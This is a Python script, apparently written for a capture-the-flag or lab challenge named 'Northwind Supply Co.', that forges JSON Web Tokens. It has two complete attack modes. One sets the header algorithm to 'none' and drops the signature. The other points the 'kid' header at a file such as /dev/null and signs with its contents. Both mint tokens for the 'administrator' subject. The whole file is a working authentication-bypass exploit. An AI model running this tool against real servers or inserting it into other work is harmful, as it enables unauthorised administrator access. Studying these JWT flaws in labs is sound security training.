#!/usr/bin/env python3
"""
Token forgery tool for the Northwind Supply Co. challenges.

Two modes, matching the two token defects:

  --alg none    Strip the signature and set the header algorithm to "none".
                Exploits a server that dispatches verification on the
                algorithm named inside the token.

  --kid PATH    Point the header's `kid` at PATH and sign with the contents of
                that file. Exploits a server that locates its verification key
                using the `kid` the token supplies.

The signature is HMAC-SHA256 over the ASCII bytes of "header.payload", exactly
as RFC 7515 specifies, and both segments are base64url encoded without
padding. That is why no cryptography is needed for --alg none: an empty
signature over an unverified token is indistinguishable from a real one to a
server that skipped the check.
"""

import argparse
import base64
import hashlib
import hmac
import json
import time
from pathlib import Path


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def decode_part(segment: str) -> dict:
    return json.loads(base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4)))


def show(label: str, token: str) -> None:
    parts = token.split(".")
    print(f"  {label}")
    for name, segment in (("header", parts[0]), ("payload", parts[1])):
        try:
            print(f"    {name:9s} {json.dumps(decode_part(segment))}")
        except Exception:
            print(f"    {name:9s} <unreadable>")
    signature = parts[2] if len(parts) > 2 else ""
    print(f"    {'signature':9s} {'<empty>' if signature == '' else signature[:32] + '...'}")


def build(claims: dict, header: dict, signing_key: str | None) -> str:
    header.setdefault("typ", "JWT")
    now = int(time.time())
    payload = {"iss": "northwind.supply", "iat": now, "exp": now + 3600, **claims}

    encoded_header = b64url(json.dumps(header, separators=(",", ":")).encode())
    encoded_payload = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{encoded_header}.{encoded_payload}"

    if signing_key is None:
        return f"{signing_input}."

    # RFC 7515: the MAC is computed over the base64url segments joined by a dot.
    signature = hmac.new(
        signing_key.encode(), signing_input.encode("utf-8"), hashlib.sha256
    ).digest()
    return f"{signing_input}.{b64url(signature)}"


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--alg", choices=["none"], help="forge an unsigned token")
    parser.add_argument("--kid", help="key id the server will read the signing key from")
    parser.add_argument("--key-file", help="file whose contents are the signing key")
    parser.add_argument("--sub", default="administrator")
    parser.add_argument("--original", help="a genuine token, shown for comparison")
    args = parser.parse_args()

    if args.original:
        show("genuine token (server-issued)", args.original)

    if args.alg == "none":
        header = {"alg": "none"}
        token = build({"sub": args.sub}, header, None)
        show("forged token (unsigned)", token)
    elif args.kid:
        key_path = Path(args.key_file or args.kid)
        # /dev/null is empty, so the signing key becomes the empty string.
        key = key_path.read_text() if key_path.exists() else ""
        header = {"alg": "HS256", "kid": args.kid}
        token = build({"sub": args.sub}, header, key)
        show("forged token (kid traversal)", token)
        print(f"    signing key  {len(key)} byte(s) read from {args.key_file or args.kid!r}")
    else:
        parser.error("choose --alg none or --kid")

    print(f"\n{token}")


if __name__ == "__main__":
    main()